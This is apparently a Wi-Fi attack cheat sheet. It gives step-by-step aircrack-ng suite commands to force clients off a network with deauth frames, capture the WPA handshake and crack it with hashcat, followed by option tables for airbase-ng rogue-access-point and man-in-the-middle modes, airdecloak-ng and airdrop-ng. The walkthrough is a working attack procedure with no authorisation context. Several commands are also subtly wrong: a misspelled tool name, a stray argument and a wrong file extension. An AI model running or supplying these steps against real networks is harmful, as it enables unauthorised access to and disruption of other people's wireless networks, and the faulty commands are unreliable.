1. Open terminal and tyoe the following commands
	```
	airmon-ng
	airmon-ng start wlan0
	ifconfig wlan0mon down
	iwconfig wlan0mon mode monitor
	ifconfig wlan0mon up
	airodump-ng wlan0mon
	
	```
	
	2. Pick a wireless interface | copy the SSID:
	```
	airodump-ng --bssid 00:22:33:FF:AB:CD -c 11 --write CrackWPA wlan0mon
	
	```
	
	3. send a deauth to one the connected devices:
	```
	airplay-ng --deauth 10 -a a 01:02:ab:03:04:ff -c 10:03:cd:04:06:fe wlan0mon
	cp CrackWPA-01.cap /root/Desktop/
	cd Desktop
	wpaclean CrackFile.cap CrackWPA-01.cap 
	aircrack-ng CrackFile.cap -J wpacrack
	```
	
	4. exit and the crack the hash
	```
	hashcat -m 2500 /root/Desktop/wpacrack.hcap
	
	```
	
	
	----------------------------------------------------------------
	

#### airbase-ng
	
| Usage: airbase-ng <op­tio­ns> <replay interf­ace> |              |                                                                                   |
|---------------------------------------------------|--------------|-----------------------------------------------------------------------------------|
|                                                   |              |                                 |
| Syntax                                            | Parameters   | Descri­ption                                                                      |
| -a                                                | bssid        | set Access Point MAC address                                                      |
| -i                                                | iface        | capture packets from this interface                                               |
| -w                                                | WEP key      | use this WEP key to encryp­t/d­ecrypt packets                                     |
| -W                                                | 0|1          | [don’t] set WEP flag in beacons 0|1 (default: auto)                               |
| -h                                                | MAC          | source mac for MITM mode                                                          |
| -f                                                | disallow     | disallow specified client MACs (default: allow)                                   |
| -q                                                | none         | quiet (do not print statis­tics)                                                  |
| -v                                                | none         | verbose (print more messages) (long –verbose)                                     |
| -M                                                | none         | M-I-T-M between [speci­fied] clients and bssids                                   |
| -A                                                | none         | Ad-Hoc Mode (allows other clients to peer) (long –ad-hoc)                         |
| -Y                                                | in|out­|both | external packet processing                                                        |
| -c                                                | channel      | sets the channel the AP is running on                                             |
| -X                                                | none         | hidden ESSID (long –hidden)                                                       |
| -s                                                | none         | force shared key authen­tic­ation                                                 |
| -S                                                | none         | set shared key challenge length (default: 128)                                    |
| -L                                                | none         | Caffe-­Latte attack (long –caff­e-l­atte)                                         |
| -N                                                | none         | Hirte attack (cfrag attack), creates arp request against wep client (long –cfrag) |
| -x                                                | nbpps        | number of packets per second (default: 100)                                       |
| -y                                                | none         | disables responses to broadcast probes                                            |
| -0                                                | none         | set all WPA,WE­P,open tags. can’t be used with -z & -Z                            |
| -z                                                | type         | sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104                             |
| -Z                                                | type         | same as -z, but for WPA2                                                          |
| -V type                                           | type         | fake EAPOL 1=MD5 2=SHA1 3=auto                                                    |
| -F                                                | prefix       | write all sent and received frames into pcap file                                 |
| -P                                                | none         | respond to all probes, even when specifying ESSIDs                                |
| -I                                                | interval     | sets the beacon interval value in ms                                              |
| -C                                                | seconds      | enables beaconing of probed ESSID values (requires -P)                            |
|                                                   |              |                                                                                   |
| Filter Options                                    |              |                                                                                   |
| Syntax                                            | Parameters   | Descri­ption                                                                      |
| –bssids                                           | <fi­le>      | read a list of BSSIDs out of that file (short -B)                                 |
| –bssid                                            | <MA­C>       | BSSID to filter/use (short -b)                                                    |
| –client                                           | <MA­C>       | MAC of client to accept (short -d)                                                |
| –clients                                          | <fi­le>      | read a list of MACs out of that file (short -D)                                   |
| –essid                                            | <ES­SID>     | specify a single ESSID (short -e)                                                 |
| –essids                                           | <fi­le>      | read a list of ESSIDs out of that file (short -E)                                 |

	

#### airdecloak-ng
	
| Usage: airdec­loak-ng [options] |            |                                                                                  |
|---------------------------------|------------|----------------------------------------------------------------------------------|
|                                 |            |                                                                                  |
| Syntax                          | Parameter  | Descri­ption                                                                     |
| -i                              | input file | Path to the capture file                                                         |
| –bssid                          | BSSID      | BSSID of the network to filter.                                                  |
| –ssid                           | ESSID      | ESSID of the network to filter (not yet implem­ented).                           |
| –filters                        | filters    | Apply theses filters in this specific order. They have to be separated by a ‘,’. |
| –null-­packets                  | none       | Assume that null packets can be cloaked (not yet implem­ented).                  |
| –disab­le-­bas­e_f­ilter        | none       | Disable the base filter.                                                         |
| –drop-frag                      | none       | Drop all fragmented packets. In most networks, fragme­ntation is not needed.     |
	


#### airdrop-ng

| Usage: airdrop-ng [options] <pcap file> |                |                                                      |
|------------------------------------------|-----------|--------------------------------|
| Syntax                                  | Parameter | Descri­ption                                                                           
| -i                                      | card      | Wireless card in monitor mode to inject from                                             
| -t                                      | csv file  | Airodump txt file in CSV format NOT the pcap                                            |
| -p                                      | psyco     | Disable the use of Psyco JIT                                                                        |
| -r                                      | Rule File | Rule File for matched deauths                                                                      |
| -u                                      | update    | Updates OUI list                                                                                            |
| -d                                      | Driver    | Injection driver. Default is mac80211                                                            |
| -s                                      | sleep     | Time to sleep between sending each packet                                              |
| -b                                      | debug     | Turn on Rule Debugging                                                                              |
| -l                                      | key       | Enable Logging to a file, if file path not provided airdrop will log to default location |
| -n                                      | nap       | Time to sleep between loops                                                                       |

	
	
	
